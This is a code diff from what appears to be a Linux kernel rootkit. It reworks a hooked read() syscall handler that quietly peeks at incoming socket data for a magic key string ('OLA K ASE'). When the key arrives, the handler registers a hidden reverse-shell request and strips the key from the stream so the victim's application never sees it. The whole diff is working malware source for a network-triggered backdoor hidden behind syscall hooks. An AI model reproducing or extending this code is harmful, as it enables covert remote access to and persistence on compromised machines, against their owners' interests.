@@ -27,6 +27,8 @@
  * Here the hook handlers.
  */
 
+#include "hooks.h"
+
 asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) {
 	int ret = 0;
 
@@ -46,36 +48,95 @@ asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned i
 #define RSHELL_KEY "OLA K ASE\n"
 
 asmlinkage int my_read64(int fd, void *buf, size_t len) {
-	int ret = 0, err = 0;
-	struct socket *sock = NULL;
-	struct sk_buff *skb = NULL;
+	//int ret = 0;
 	char *ubuf = NULL;
-	struct file *file = NULL;
-	struct skb_seq_state seq;
-	unsigned int avail = 0;
-	const unsigned char *ptr = NULL;
+	int nread = 0;
+	/*
+	pid_t pid = 0;
+	off_t from = 0, to = 0;
+	struct read_queue *queue = NULL;
 
-	file = f_fget(fd);
-	if (file) {
-		sock = f_sock_from_file(file, &err);
-		if (sock && sock->type == SOCK_STREAM && (skb = skb_peek(&sock->sk->sk_receive_queue))) {
-			f_skb_prepare_seq_read(skb, 0, skb->len, &seq);
-			avail = f_skb_seq_read(0, &ptr, &seq);
-			f_printk("avail = %d vs %d\n", avail, sizeof(RSHELL_KEY));
-			f_skb_abort_seq_read(&seq);
-			if ((sizeof(RSHELL_KEY) - 1) == avail && f_strncmp(RSHELL_KEY, ptr, avail) == 0) {
-				f_printk("GOT RSHELL REQUEST!\n");
+	pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
+
+	// serve queue as request if there's one.
+	if ((queue = get_read_queue(pid))) {
+		ubuf = queue->ubuf;
+		from = queue->from;
+		to = queue->to;
+
+		nread = to - from;
+		if (nread <= len) {
+			f_memcpy(buf, ubuf + from, nread);
+			destroy_read_queue(pid);
+			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+			return nread;
+		} else {
+			f_memcpy(buf, ubuf + from, len);
+			update_read_queue(pid, ubuf, from + len, to);
+			return len;
+		}
+	} else {
+		// check if the pending data is the shell request
+		ret = SYSCALL64(__NR_ioctl, fd, FIONREAD, &nread, 0, 0, 0);
+		f_printk("ioctl ret = %d\n", ret);
+		if (!ret) {
+			if (nread == sizeof(RSHELL_KEY) - 1) {
+				f_printk("%d bytes to read\n", nread);
 				ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
-				if (ubuf != MAP_FAILED) {
-					f_fput(file);
-					ret = SYSCALL64(__NR_read, fd, ubuf, avail, 0, 0, 0);
+				if (ubuf == MAP_FAILED) {
+					return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
+				}
+				ret = SYSCALL64(__NR_read, fd, ubuf, nread, 0, 0, 0);
+				if (ret < 0) {
 					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
 					return my_read64(fd, buf, len);
 				}
+				if (f_strncmp(RSHELL_KEY, ubuf, nread) == 0) {
+					f_printk("GOT RSHELL REQUEST!\n");
+					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+					return my_read64(fd, buf, len);
+				}
+				// at this point, we received a same sized than the shell request packet, but it's not a request packet.
+				// so, we must queue it, if the user read less than we did, and leave it to the users, the same speed they read,
+				// on the next calls to sys_read() (which is now my_read64()).
+				if (nread <= len) {
+					f_memcpy(buf, ubuf, nread);
+					SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+					return nread;
+				} else {
+					f_memcpy(buf, ubuf, len);
+					create_read_queue(pid, ubuf, len, nread);
+					return len;
+				}
 			}
 		}
-		f_fput(file);
 	}
+
+	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
+	*/
+
+	ubuf = (void *) SYSCALL64(__NR_mmap, 0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	if (ubuf != MAP_FAILED) {
+		// MSG_KEEP is the key to keep the data in the queue.
+		// then we can compare and serve it without doing a lot of work.
+		nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, MSG_PEEK, 0, 0);
+		if (nread >= 0) {
+			f_printk("recvfrom %d bytes\n", nread);
+		}
+		if (nread == sizeof(RSHELL_KEY) - 1 && f_strncmp(ubuf, RSHELL_KEY, nread) == 0) {
+			f_printk("GOT RSHELL REQUEST\n");
+			// empty buffer
+			nread = SYSCALL64(__NR_recvfrom, fd, ubuf, sizeof(RSHELL_KEY) - 1, 0, 0, 0);
+			if (nread == sizeof(RSHELL_KEY) - 1) {
+				f_printk("emptying buffer and calling myself...\n");
+				SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+				return my_read64(fd, buf, len);
+			}
+			SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+		}
+		SYSCALL64(__NR_munmap, ubuf, 4096, 0, 0, 0, 0);
+	}
+
 	return SYSCALL64(__NR_read, fd, buf, len, 0, 0, 0);
 }
 
